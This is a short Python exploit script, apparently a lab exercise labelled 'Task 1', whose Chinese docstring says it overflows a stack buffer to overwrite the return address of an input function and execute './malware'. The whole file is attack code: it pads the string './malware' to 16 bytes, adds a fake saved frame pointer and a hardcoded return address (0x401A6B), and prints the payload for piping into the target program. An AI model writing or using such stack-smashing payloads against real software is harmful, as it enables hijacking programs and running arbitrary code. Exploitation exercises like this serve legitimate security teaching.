#!/usr/bin/env python3
"""Task 1: 利用栈溢出篡改 input 的返回地址，执行 ./malware"""
import sys

buf = b"./malware\x00"                    
buf += b"A" * (16 - len(buf))             
saved_rbp = b"B" * 8                      
ret = (0x401A6B).to_bytes(8, "little")    
sys.stdout.buffer.write(buf + saved_rbp + ret + b"\n")